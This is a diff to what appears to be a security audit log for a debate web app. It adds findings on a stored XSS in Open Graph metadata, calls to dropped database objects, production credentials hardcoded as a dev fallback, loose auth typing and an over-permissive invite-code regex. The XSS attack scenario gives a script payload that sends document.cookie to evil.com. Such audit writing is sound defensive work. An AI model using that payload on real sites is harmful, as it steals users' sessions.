@@ -23,7 +23,25 @@ When a finding is fixed: strike it through and add a `FIXED in commit <sha>` not
 
 Historical damage scope: exactly 1 complete debate existed in production at fix time, so real-world rating inflation was minimal. Going forward, all new PvP debates are protected.
 
-*(No HIGH findings currently open.)*
+### P5-SD-1. `api/challenge.html.js:20` — Stored XSS via unescaped `preview.topic` in OG description — **OPEN**
+**Phase 5 (Architectural Blindness), 2026-04-17.** `ogDesc` is set using raw `preview.topic` (line 20) instead of the already-HTML-escaped `topic` variable produced on line 13. Any user who can create a challenge can inject arbitrary script into the challenge link's Open Graph metadata, executing in every recipient's browser when the link is previewed or the page is loaded. One-token fix: replace `preview.topic` with `topic` on line 20.
+
+**Attack scenario:** Attacker creates a challenge with topic `"><script>document.location='https://evil.com/?c='+document.cookie</script>`. Victim opens the challenge link. Script executes in victim's browser with full session access.
+
+### P5-BI-1. `src/pages/auto-debate.vote.ts:55` — Dead RPC call to dropped `cast_auto_debate_vote` — **OPEN**
+**Phase 5 (Architectural Blindness), 2026-04-17.** `cast_auto_debate_vote` was dropped from production in S249 (LM-211) but the call site in `auto-debate.vote.ts:55` was not removed. All votes silently fail; the UI shows locally-incremented fake counts that are never persisted. Users believe they voted; no vote is recorded.
+
+**Attack scenario:** Passive data integrity — all auto-debate vote data since S249 is fabricated. Leaderboard or outcome logic that reads vote counts sees zeros or stale pre-drop counts.
+
+### P5-BI-2. `src/arena/arena-lobby.ts:199` — Dead table query against dropped `auto_debates` — **OPEN**
+**Phase 5 (Architectural Blindness), 2026-04-17.** The lobby fallback path at line 199 queries the `auto_debates` table, which was dropped in the same S249 cleanup as the RPC above. During off-peak hours when the primary query returns empty, the fallback fires, throws a silent Postgres error, and the arena lobby renders empty placeholders with no user-visible error.
+
+**Attack scenario:** Off-peak reliability — during low-traffic periods the lobby appears broken to all users with no operator alert.
+
+### P5-EP-1. `src/config.ts:56-57` — Production credentials hardcoded as dev fallback — **OPEN**
+**Phase 5 (Architectural Blindness), 2026-04-17.** The Supabase URL and anon key are hardcoded as fallback values when `import.meta.env` variables are absent. Any `npm run dev` session without a `.env` file silently connects to live production. No staging environment exists, so this is the only environment. Every local dev session is a live production session by default.
+
+**Attack scenario:** Developer runs `npm run dev` on a fresh checkout without `.env`. Triggers real billing events, mutates real user data, fires real Supabase function invocations — no sandbox.
 
 ### ~~H-K1. `arena-feed-spec-chat.ts:171` — Stored XSS in report button onclick via single-quote injection~~ — **FIXED 2026-04-14 (commit 4166c1e)**
 **Batch 12R. FIRST HIGH SINCE H-A2. Unanimous 5/5 Stage 3 agents independently confirmed. Fixed same day.** The `renderMessages` function built a report button with an inline `onclick` attribute using double-quote outer delimiters and single-quote inner JS string delimiters, interpolating `encodeURIComponent(m.message)` into that JS string. `encodeURIComponent` does not encode the single-quote character (RFC 3986 unreserved), so a stored spectator chat message containing `'` terminated the JS string and allowed arbitrary JS execution in any spectator's browser that clicked the report button. `m.message` was fully user-controlled (spectator chat content), making this a stored XSS with worm potential.
@@ -408,7 +426,13 @@ Concrete failure modes: withdraw with `currentGroupId = null` throws at the non-
 **Batch B.** `set_selectedMode(el.dataset.mode as DebateMode)` at line 60 — if `data-mode` attribute is missing or empty string, `undefined` is silently written to module state. No fallback, no guard. Compare: `opponentName` (line 68) has `|| 'Challenger'`, `opponentElo` (line 70) has `|| 1200`, but `mode` has no equivalent protection. Downstream code consuming `selectedMode` could behave unpredictably on undefined. 3/5 Stage 3 agents flagged. Fix: add a fallback e.g. `|| 'amplified'` or a runtime guard.
 
 ### M-Q3. `arena-lobby.ts:199` — `sb!` non-null assertion on `getSupabaseClient()` in fallback branch
-**Batch B.** In `loadLobbyFeed`, `sb` is obtained from `getSupabaseClient()` (which can return null if the client is not initialized). The fallback branch uses `sb!.from('auto_debates')` — the `!` non-null assertion bypasses TypeScript's null check and would throw a runtime exception if `sb` is null. The happy path uses a separate `safeRpc` call which handles null internally; only the fallback branch has this exposure. Agents 03 and 05 flagged in needs_review. Fix: add a null guard before `sb!.from(...)` and return early or fall through to placeholder rendering.
+**Batch B.** In `loadLobbyFeed`, `sb` is obtained from `getSupabaseClient()` (which can return null if the client is not initialized). The fallback branch uses `sb!.from('auto_debates')` — the `!` non-null assertion bypasses TypeScript's null check and would throw a runtime exception if `sb` is null. The happy path uses a separate `safeRpc` call which handles null internally; only the fallback branch has this exposure. Agents 03 and 05 flagged in needs_review. Fix: add a null guard before `sb!.from(...)` and return early or fall through to placeholder rendering. **Note: superseded by P5-BI-2 — the table itself is dropped; the entire fallback branch should be removed.**
+
+### P5-BI-3. `src/arena/arena-feed-realtime.ts:42` — `(client as any).auth.getSession()` suppresses auth type safety — **OPEN**
+**Phase 5 (Architectural Blindness), 2026-04-17.** Type-casting `client` to `any` bypasses TypeScript's auth invariant checks. If `getSession()` is called on an uninitialized or expired client, the cast suppresses the compiler error and the failure becomes a runtime exception. Related to SYC-M-01 from earlier audit. Fix: use the typed `getSession()` call pattern from `auth.core.ts`.
+
+### P5-BI-4. `src/share.ts:158` — Ref code regex too permissive vs generator output — **OPEN**
+**Phase 5 (Architectural Blindness), 2026-04-17.** `share.ts:158` validates invite codes with `/^[a-zA-Z0-9_-]{4,20}$/` — accepts uppercase, underscores, hyphens, and lengths 4–20. `api/invite.js` generates codes as `/^[a-z0-9]{5}$/` only — 5-char lowercase alphanumeric. The mismatch means the validator accepts codes that the generator never produces, creating an input surface that bypasses the canonical format. Fix: tighten `share.ts:158` to `/^[a-z0-9]{5}$/`.
 
 ### L-P1. `arena-deepgram.ts` — `_language` not reset in `cleanupDeepgram`
 **Batch A.** `cleanupDeepgram` nulls `_onTranscript`, `_onInterim`, `_onStatus`, and `_stream`, but does not reset `_language` to `'en'`. Since `startTranscription` always overwrites `_language` on every call (via `language || 'en'`), this is benign in practice. But `_language` is the only module-level state variable that survives cleanup, creating an asymmetry. Flagged in needs_review by all 5 agents. Low priority.
